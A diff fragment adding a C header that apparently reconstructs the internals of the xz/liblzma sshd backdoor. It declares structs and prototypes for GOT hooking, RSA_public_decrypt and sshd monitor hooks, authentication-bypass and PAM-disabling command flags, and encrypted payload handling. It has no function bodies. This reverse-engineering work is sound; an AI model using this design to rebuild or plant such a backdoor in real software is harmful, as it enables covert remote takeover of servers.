+ u8 signed_data;
+} backdoor_hooks_data_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) backdoor_hooks_ctx {
+ u8 _unknown1606[0x30];
+ backdoor_shared_globals_t *shared;
+ backdoor_hooks_data_t **hooks_data_addr;
+ uintptr_t (*symbind64)(
+  Elf64_Sym *sym, unsigned int ndx,
+  uptr *refcook, uptr *defcook,
+  unsigned int flags, const char *symname);
+ pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
+ pfn_RSA_get0_key_t hook_RSA_get0_key;
+ log_handler_fn mm_log_handler;
+ u8 _unknown1616[sizeof(void *)];
+ u8 _unknown1617[sizeof(void *)];
+ sshd_monitor_func_t mm_answer_keyallowed;
+ sshd_monitor_func_t mm_answer_keyverify;
+ u8 _unknown1620[sizeof(void *)];
+} backdoor_hooks_ctx_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) backdoor_setup_params {
+ u8 _unknown1634[0x8];
+ backdoor_shared_globals_t *shared;
+ backdoor_hooks_ctx_t *hook_params;
+ lzma_check_state dummy_check_state;
+ elf_entry_ctx_t *entry_ctx;
+} backdoor_setup_params_t;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) elf_handles {
+ elf_info_t *main;
+ elf_info_t *dynamic_linker;
+ elf_info_t *libc;
+ elf_info_t *liblzma;
+ elf_info_t *libcrypto;
+} elf_handles_t;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) main_elf {
+ elf_handles_t *elf_handles;
+ Elf64_Ehdr *dynamic_linker_ehdr;
+ void **__libc_stack_end;
+} main_elf_t;
+;
+;
+;
+;
+typedef struct backdoor_data backdoor_data_t;
+typedef struct __attribute__((packed)) backdoor_data_handle {
+ backdoor_data_t *data;
+ elf_handles_t *elf_handles;
+} backdoor_data_handle_t;
+;
+;
+typedef struct __attribute__((packed)) string_item {
+ EncodedStringId string_id;
+ u8 _unknown1703[4];
+ void *func_start;
+ void *func_end;
+ void *xref;
+} string_item_t;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) string_references {
+ string_item_t entries[27];
+} string_references_t;
+;
+;
+typedef struct __attribute__((packed)) backdoor_data {
+ struct link_map *main_map;
+ struct link_map *dynamic_linker_map;
+ struct link_map *liblzma_map;
+ struct link_map *libcrypto_map;
+ struct link_map *libsystemd_map;
+ struct link_map *libc_map;
+ elf_handles_t elf_handles;
+ backdoor_data_handle_t data_handle;
+ elf_info_t main_info;
+ elf_info_t dynamic_linker_info;
+ elf_info_t libc_info;
+ elf_info_t liblzma_info;
+ elf_info_t libcrypto_info;
+ libc_imports_t libc_imports;
+ string_references_t string_refs;
+ lzma_allocator fake_allocator;
+ lzma_allocator *import_resolver;
+} backdoor_data_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) backdoor_shared_libraries_data {
+ backdoor_data_t *data;
+ elf_handles_t *elf_handles;
+ void* RSA_public_decrypt_plt;
+ void* EVP_PKEY_set1_RSA_plt;
+ void* RSA_get0_key_plt;
+ backdoor_hooks_data_t **hooks_data_addr;
+ libc_imports_t *libc_imports;
+} backdoor_shared_libraries_data_t;
+;
+;
+;
+;
+;
+;
+;
+typedef union {
+ u32 index;
+ struct {
+  u32 bit_index : 3;
+  u32 byte_index : 29;
+ };
+} secret_data_shift_cursor_t;
+typedef struct __attribute__((packed)) secret_data_item {
+ u8 *code;
+ secret_data_shift_cursor_t shift_cursor;
+ u32 operation_index;
+ u32 shift_count;
+ u32 index;
+} secret_data_item_t;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) key_payload_hdr {
+ union {
+  u8 bytes[16];
+  struct __attribute__((packed)) {
+   u32 field_a;
+   u32 field_b;
+   u64 field_c;
+  };
+ };
+} backdoor_payload_hdr_t;
+;
+typedef union __attribute__((packed)) {
+ u8 value[2];
+ u16 size;
+} u_cmd_arguments_t;
+typedef struct __attribute__((packed)) cmd_arguments {
+ u8 flags1;
+ u8 flags2;
+ u8 flags3;
+ u_cmd_arguments_t u;
+} cmd_arguments_t;
+typedef struct __attribute__((packed)) key_payload_body {
+ u8 signature[114];
+ cmd_arguments_t args;
+ u8 data[0x1A1];
+} backdoor_payload_body_t;
+;
+typedef struct __attribute__((packed)) backdoor_payload {
+ union {
+  u8 data[0x228];
+  struct __attribute__((packed)) {
+   backdoor_payload_hdr_t header;
+   backdoor_payload_body_t body;
+  };
+ };
+} backdoor_payload_t;
+;
+;
+;
+typedef struct __attribute__((packed)) key_payload {
+ union {
+  u8 data[0];
+  struct __attribute__((packed)) {
+   backdoor_payload_hdr_t hdr;
+   u16 body_length;
+   u8 body[0];
+  };
+ };
+} key_payload_t;
+;
+;
+;
+enum CommandFlags1 {
+ X_FLAGS1_8BYTES = 0x1,
+ X_FLAGS1_SETLOGMASK = 0x4,
+ X_FLAGS1_SOCKET_INDEX = 0x20,
+ X_FLAGS1_DISABLE_PAM = 0x40,
+ X_FLAGS1_NO_EXTENDED_SIZE = 0x80
+};
+enum CommandFlags2 {
+ X_FLAGS2_IMPERSONATE = 0x1,
+ X_FLAGS2_CHANGE_MONITOR_REQ = 0x2,
+ X_FLAGS2_AUTH_BYPASS = 0x4,
+ X_FLAGS2_CONTINUATION = 0x40,
+ X_FLAGS2_PSELECT = 0xC0,
+ X_FLAGS2_SOCKFD_MASK = 0x78
+};
+enum CommandFlags3 {
+ X_FLAGS3_SOCKET_NUM = 0x1F,
+ X_FLAGS3_MONITOR_REQ_VAL = 0x3F
+};
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) key_ctx {
+ const BIGNUM *rsa_n;
+ const BIGNUM *rsa_e;
+ cmd_arguments_t args;
+ backdoor_payload_t payload;
+ u8 _unknown2025[32 + 16];
+ u8 ivec[16];
+ u8 ed448_key[57];
+ u8 _unknown2028[2];
+} key_ctx_t;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) monitor_data {
+ u32 cmd_type;
+ u8 _unknown2044[4];
+ cmd_arguments_t *args;
+ const BIGNUM *rsa_n;
+ const BIGNUM *rsa_e;
+ u8 *payload_body;
+ u16 payload_body_size;
+ u8 _unknown2050[6];
+ RSA *rsa;
+} monitor_data_t;
+;
+;
+;
+;
+;
+;
+;
+typedef union __attribute__((packed)) backdoor_runtime_data {
+ monitor_data_t monitor;
+ u8 data[608];
+} backdoor_runtime_data_t;
+typedef struct __attribute__((packed)) run_backdoor_commands_data {
+ u64 body_size;
+ BOOL *p_do_orig;
+ u64 payload_size;
+ u64 hostkey_hash_offset;
+ RSA *rsa;
+ u8 *payload_data_ptr;
+ u8 *ed448_key_ptr;
+ u64 num_keys;
+ u8 _unknown2088[4];
+ u32 key_cur_idx;
+ u64 key_prev_idx;
+ u8 _unknown2091[7];
+ u8 unk57;
+ union {
+  struct __attribute__((packed)) {
+   int socket_fd;
+   u32 fd_recv_size;
+   u8 fd_recv_buf[64];
+  } sock;
+  struct __attribute__((packed)) {
+   u64 num_host_keys;
+   u64 num_host_pubkeys;
+   u8 ed448_key[57];
+  } keys;
+ } u;
+ u8 _unknown2105[7];
+ backdoor_runtime_data_t data;
+ key_ctx_t kctx;
+} run_backdoor_commands_data_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) backdoor_cpuid_reloc_consts {
+ ptrdiff_t cpuid_random_symbol_got_offset;
+ u64 cpuid_got_index;
+ ptrdiff_t backdoor_init_stage2_got_offset;
+} backdoor_cpuid_reloc_consts_t;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {
+ ptrdiff_t tls_get_addr_plt_offset;
+ ptrdiff_t tls_get_addr_random_symbol_got_offset;
+} backdoor_tls_get_addr_reloc_consts_t;
+;
+;
+;
+typedef struct __attribute__((packed)) elf_functions {
+ u8 _unknown2173[sizeof(u64)];
+ int (*init_hook_functions)(backdoor_hooks_ctx_t *funcs);
+ u8 _unknown2180[sizeof(u64)];
+ u8 _unknown2181[sizeof(u64)];
+ void *(*elf_symbol_get_addr)(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+ u8 _unknown2188[sizeof(u64)];
+ BOOL (*elf_parse)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
+} elf_functions_t;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) fake_lzma_allocator {
+ u8 _unknown2203[sizeof(u64)];
+ lzma_allocator allocator;
+} fake_lzma_allocator_t;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) instruction_search_ctx
+{
+ u8 *start_addr;
+ u8 *end_addr;
+ u8 *offset_to_match;
+ u32 *output_register_to_match;
+ u8 *output_register;
+ BOOL result;
+ u8 _unknown2240[0x4];
+ backdoor_hooks_data_t *hooks;
+ imported_funcs_t *imported_funcs;
+} instruction_search_ctx_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+extern BOOL sshd_proxy_elevate(monitor_data_t *args, global_context_t *ctx);
+extern BOOL x86_dasm(dasm_ctx_t *ctx, u8 *code_start, u8 *code_end);
+extern BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx);
+extern BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement);
+extern BOOL find_instruction_with_mem_operand(
+ u8 *code_start,
+ u8 *code_end,
+ dasm_ctx_t *dctx,
+ void *mem_address
+);
+extern BOOL find_lea_instruction_with_mem_operand(
+ u8 *code_start,
+ u8 *code_end,
+ dasm_ctx_t *dctx,
+ void *mem_address
+);
+extern BOOL find_add_instruction_with_mem_operand(
+ u8 *code_start,
+ u8 *code_end,
+ dasm_ctx_t *dctx,
+ void *mem_address
+);
+extern BOOL find_mov_lea_instruction(
+ u8 *code_start,
+ u8 *code_end,
+ BOOL is_64bit_operand,
+ BOOL load_flag,
+ dasm_ctx_t *dctx
+);
+extern BOOL find_mov_instruction(
+ u8 *code_start,
+ u8 *code_end,
+ BOOL is_64bit_operand,
+ BOOL load_flag,
+ dasm_ctx_t *dctx
+);
+extern BOOL find_instruction_with_mem_operand_ex(
+ u8 *code_start,
+ u8 *code_end,
+ dasm_ctx_t *dctx,
+ int opcode,
+ void *mem_address
+);
+extern BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part);
+extern u8 *find_string_reference(
+ u8 *code_start,
+ u8 *code_end,
+ const char *str
+);
+extern u8 *elf_find_string_reference(
+ elf_info_t *elf_info,
+ EncodedStringId encoded_string_id,
+ u8 *code_start,
+ u8 *code_end
+);
+extern BOOL find_reg2reg_instruction(u8 *code_start, u8 *code_end, dasm_ctx_t *dctx);
+extern BOOL find_function_prologue(u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode);
+extern BOOL find_function(
+ u8 *code_start,
+ void **func_start,
+ void **func_end,
+ u8 *search_base,
+ u8 *code_end,
+ FuncFindType find_mode);
+extern BOOL elf_contains_vaddr(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);
+extern BOOL elf_contains_vaddr_relro(elf_info_t *elf_info, u64 vaddr, u64 size, u32 p_flags);
+extern BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
+extern BOOL is_gnu_relro(Elf64_Word p_type, u32 addend);
+extern BOOL main_elf_parse(main_elf_t *main_elf);
+extern char *check_argument(char arg_first_char, char* arg_name);
+extern BOOL process_is_sshd(elf_info_t *elf, u8 *stack_end);
+extern BOOL elf_find_string_references(elf_info_t *elf_info, string_references_t *refs);
+extern Elf64_Sym *elf_symbol_get(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);
+extern void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+extern void *elf_get_code_segment(elf_info_t *elf_info, u64 *pSize);
+extern void *elf_get_rodata_segment(elf_info_t *elf_info, u64 *pSize);
+extern void *elf_get_data_segment(elf_info_t *elf_info, u64 *pSize, BOOL get_alignment);
+extern void *elf_get_reloc_symbol(
+ elf_info_t *elf_info,
+ Elf64_Rela *relocs,
+ u32 num_relocs,
+ u64 reloc_type,
+ EncodedStringId encoded_string_id);
+extern void *elf_get_plt_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+extern void *elf_get_got_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+extern BOOL elf_find_function_pointer(
+ StringXrefId xref_id,
+ void **pOutCodeStart, void **pOutCodeEnd,
+ void **pOutFptrAddr, elf_info_t *elf_info,
+ string_references_t *xrefs,
+ global_context_t *ctx);
+extern char *elf_find_string(
+ elf_info_t *elf_info,
+ EncodedStringId *stringId_inOut,
+ void *rodata_start_ptr);
+extern lzma_allocator *get_lzma_allocator(void);
+extern fake_lzma_allocator_t *get_lzma_allocator_address(void);
+extern void *fake_lzma_alloc(void *opaque, size_t nmemb, size_t size);
+extern void fake_lzma_free(void *opaque, void *ptr);
+extern elf_functions_t *get_elf_functions_address(void);
+extern BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor);
+extern BOOL secret_data_append_from_code(
+ void *code_start,
+ void *code_end,
+ secret_data_shift_cursor_t shift_cursor,
+ unsigned shift_count, BOOL start_from_call);
+extern BOOL secret_data_append_item(
+ secret_data_shift_cursor_t shift_cursor,
+ unsigned operation_index,
+ unsigned shift_count,
+ int index, u8 *code);
+extern BOOL secret_data_append_items(
+ secret_data_item_t *items,
+ u64 items_count,
+ BOOL (*appender)(secret_data_shift_cursor_t, unsigned, unsigned, int, u8 *));
+extern BOOL secret_data_append_from_address(
+ void *addr,
+ secret_data_shift_cursor_t shift_cursor,
+ unsigned shift_count, unsigned operation_index);
+extern BOOL secret_data_append_singleton(
+ u8 *call_site, u8 *code,
+ secret_data_shift_cursor_t shift_cursor,
+ unsigned shift_count, unsigned operation_index);
+extern BOOL secret_data_append_from_call_site(
+ secret_data_shift_cursor_t shift_cursor,
+ unsigned shift_count, unsigned operation_index,
+ BOOL bypass
+);
+extern BOOL backdoor_setup(backdoor_setup_params_t *params);
+extern void init_ldso_ctx(ldso_ctx_t *ldso_ctx);
+extern unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame);
+extern void * backdoor_init(elf_entry_ctx_t *state, u64 *caller_frame);
+extern void init_elf_entry_ctx(elf_entry_ctx_t *ctx);
+extern void update_got_offset(elf_entry_ctx_t *ctx);
+extern void update_cpuid_got_index(elf_entry_ctx_t *ctx);
+extern BOOL backdoor_init_stage2(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);
+extern BOOL resolve_libc_imports(
+ struct link_map *libc,
+ elf_info_t *libc_info,
+ libc_imports_t *imports
+);
+extern BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data);
+extern BOOL process_shared_libraries_map(struct link_map *r_map, backdoor_shared_libraries_data_t *data);
+extern BOOL chacha_decrypt(
+ u8 *in, int inl,
+ u8 *key, u8 *iv,
+ u8 *out, imported_funcs_t *funcs
+);
+extern BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx);
+extern BOOL is_range_mapped(u8* addr, u64 length, global_context_t* ctx);
+extern u32 count_bits(u64 x);
+extern EncodedStringId get_string_id(const char *string_begin, const char *string_end);
+extern unsigned int _get_cpuid_modified(unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame);
+extern void _cpuid_gcc(unsigned int level, unsigned int *a, unsigned int *b, unsigned int *c, unsigned int *d);
+extern int init_hooks_ctx(backdoor_hooks_ctx_t *ctx);
+extern int init_shared_globals(backdoor_shared_globals_t *shared_globals);
+extern BOOL init_imported_funcs(imported_funcs_t *imported_funcs);
+extern void *update_got_address(elf_entry_ctx_t *entry_ctx);
+extern ptrdiff_t get_tls_get_addr_random_symbol_got_offset(elf_entry_ctx_t *ctx);
+typedef struct dl_tls_index
+{
+ uint64_t ti_module;
+ uint64_t ti_offset;
+} tls_index;
+extern void *dummy_tls_get_addr (tls_index *ti);
+extern uintptr_t backdoor_symbind64(
+ Elf64_Sym *sym,
+ unsigned int ndx,
+ uptr *refcook, uptr *defcook,
+ unsigned int flags,
+ const char *symname);
+extern BOOL run_backdoor_commands(RSA *key, global_context_t *ctx, BOOL *do_orig);
+extern BOOL find_dl_audit_offsets(
+ backdoor_data_handle_t *data,
+ ptrdiff_t *libname_offset,
+ backdoor_hooks_data_t *hooks,
+ imported_funcs_t *imported_funcs);
+extern BOOL find_link_map_l_name(
+ backdoor_data_handle_t *data_handle,
+ ptrdiff_t *libname_offset,
+ backdoor_hooks_data_t *hooks,
+ imported_funcs_t *imported_funcs);
+extern BOOL find_dl_naudit(
+ elf_info_t *dynamic_linker_elf,
+ elf_info_t *libcrypto_elf,
+ backdoor_hooks_data_t *hooks,
+ imported_funcs_t *imported_funcs);
+extern BOOL find_link_map_l_audit_any_plt(
+ backdoor_data_handle_t *data,
+ ptrdiff_t libname_offset,
+ backdoor_hooks_data_t *hooks,
+ imported_funcs_t *imported_funcs);
+extern BOOL find_link_map_l_audit_any_plt_bitmask(
+ backdoor_data_handle_t *data,
+ instruction_search_ctx_t *search_ctx);
+extern BOOL sshd_get_sensitive_data_address_via_xcalloc(
+ u8 *data_start,
+ u8 *data_end,
+ u8 *code_start,
+ u8 *code_end,
+ string_references_t *string_refs,
+ void **sensitive_data_out);
+extern BOOL sshd_get_sensitive_data_address_via_krb5ccname(
+ u8 *data_start,
+ u8 *data_end,
+ u8 *code_start,
+ u8 *code_end,
+ void **sensitive_data_out,
+ elf_info_t *elf);
+extern int sshd_get_sensitive_data_score_in_demote_sensitive_data(
+ void *sensitive_data,
+ elf_info_t *elf,
+ string_references_t *refs);
+extern int sshd_get_sensitive_data_score_in_main(
+ void *sensitive_data,
+ elf_info_t *elf,
+ string_references_t *refs);
+extern int sshd_get_sensitive_data_score_in_do_child(
+ void *sensitive_data,
+ elf_info_t *elf,
+ string_references_t *refs);
+extern int sshd_get_sensitive_data_score(
+ void *sensitive_data,
+ elf_info_t *elf,
+ string_references_t *refs);
+extern BOOL bignum_serialize(
+ u8 *buffer, u64 bufferSize,
+ u64 *pOutSize,
+ const BIGNUM *bn,
+ imported_funcs_t *funcs);
+extern BOOL sshbuf_bignum_is_negative(struct sshbuf *buf);
+extern BOOL rsa_key_hash(
+ const RSA *rsa,
+ u8 *mdBuf,
+ u64 mdBufSize,
+ imported_funcs_t *funcs);
+extern BOOL dsa_key_hash(
+ const DSA *dsa,
+ u8 *mdBuf,
+ u64 mdBufSize,
+ global_context_t *ctx);
+extern BOOL sha256(
+ const void *data,
+ size_t count,
+ u8 *mdBuf,
+ u64 mdBufSize,
+ imported_funcs_t *funcs);
+extern BOOL verify_signature(
+ struct sshkey *sshkey,
+ u8 *signed_data,
+ u64 sshkey_digest_offset,
+ u64 signed_data_size,
+ u8 *signature,
+ u8 *ed448_raw_key,
+ global_context_t *global_ctx
+);
+extern BOOL sshd_patch_variables(
+ BOOL skip_root_patch,
+ BOOL disable_pam,
+ BOOL replace_monitor_reqtype,
+ int monitor_reqtype,
+ global_context_t *global_ctx
+);
+extern BOOL sshd_find_monitor_struct(
+ elf_info_t *elf,
+ string_references_t *refs,
+ global_context_t *ctx
+);
+extern BOOL sshd_find_main(
+ u8 **code_start_out,
+ elf_info_t *sshd,
+ elf_info_t *libcrypto,
+ imported_funcs_t *imported_funcs
+);
+extern BOOL sshd_find_monitor_field_addr_in_function(
+ u8 *code_start,
+ u8 *code_end,
+ u8 *data_start,
+ u8 *data_end,
+ void **monitor_field_ptr_out,
+ global_context_t *ctx
+);
+extern void *find_addr_referenced_in_mov_instruction(
+ StringXrefId id,
+ string_references_t *refs,
+ void *mem_range_start,
+ void *mem_range_end
+);
+extern BOOL validate_log_handler_pointers(
+ void *addr1,
+ void *addr2,
+ void *search_base,
+ u8 *code_end,
+ string_references_t *refs,
+ global_context_t *global
+);
+enum SocketMode {
+ DIR_WRITE = 0,
+ DIR_READ = 1
+};
+extern BOOL sshd_get_client_socket(
+ global_context_t *ctx,
+ int *pSocket,
+ int socket_index,
+ enum SocketMode socket_direction
+);
+extern BOOL sshd_get_usable_socket(int *pSock, int socket_index, libc_imports_t *imports);
+extern BOOL sshd_get_sshbuf(struct sshbuf *sshbuf, global_context_t *ctx);
+extern BOOL sshbuf_extract(struct sshbuf *buf, global_context_t *ctx, void **p_sshbuf_d, size_t *p_sshbuf_size);
+extern BOOL extract_payload_message(
+ struct sshbuf *sshbuf_data,
+ size_t sshbuf_size,
+ size_t *out_payload_size,
+ global_context_t *ctx);
+extern BOOL decrypt_payload_message(
+ key_payload_t *payload,
+ size_t payload_size,
+ global_context_t *ctx);
+extern BOOL check_backdoor_state(global_context_t *ctx);
+extern int mm_answer_keyallowed_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+extern int mm_answer_keyverify_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+extern int mm_answer_authpassword_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+extern void mm_log_handler_hook(
+ LogLevel level,
+ int forced,
+ const char *msg,
+ void *ctx);
+extern ssize_t fd_read(
+ int fd,
+ void *buffer,
+ size_t count,
+ libc_imports_t *funcs);
+extern ssize_t fd_write(
+ int fd,
+ void *buffer,
+ size_t count,
+ libc_imports_t *funcs);
+extern BOOL contains_null_pointers(
+ void **pointers,
+ unsigned int num_pointers
+);
+extern BOOL count_pointers(
+ void **ptrs,
+ u64 *count_out,
+ libc_imports_t *funcs
+);
+extern BOOL sshd_configure_log_hook(cmd_arguments_t *cmd_flags, global_context_t *ctx);
+extern int hook_RSA_public_decrypt(
+ int flen, unsigned char *from,
+ unsigned char *to, RSA *rsa, int padding);
+extern void sshd_log(
+ sshd_log_ctx_t *log_ctx,
+ LogLevel level, const char *fmt, ...);
+extern BOOL sshd_find_sensitive_data(
+ elf_info_t *sshd,
+ elf_info_t *libcrypto,
+ string_references_t *refs,
+ imported_funcs_t *funcs,
+ global_context_t *ctx);
+extern ssize_t c_strlen(
+ char *str
+);
+extern ssize_t c_strnlen(
+ char *str,
+ size_t max_len
+);
+extern void* c_memmove(
+ char *dest,
+ char *src,
+ size_t cnt
+);
+extern u32 resolver_call_count;
+;
+extern global_context_t *global_ctx;
+;
+extern backdoor_hooks_data_t *hooks_data;
+;
+extern backdoor_hooks_data_t *hooks_data_addr;
+;
+extern const ptrdiff_t fake_lzma_allocator_offset;
+;
+extern fake_lzma_allocator_t fake_lzma_allocator;
+;
+extern void *lzma_alloc(size_t size, lzma_allocator *allocator);
+extern const ptrdiff_t elf_functions_offset;
+;
+extern const elf_functions_t elf_functions;
+;
+extern const u64 cpuid_random_symbol;
+;
+extern const u64 tls_get_addr_random_symbol;
+;
+extern const backdoor_cpuid_reloc_consts_t cpuid_reloc_consts;
+;
+extern const backdoor_tls_get_addr_reloc_consts_t tls_get_addr_reloc_consts;
+;
+extern const u64 string_mask_data[238];
+;
+extern const u32 string_action_data[1304];
+;
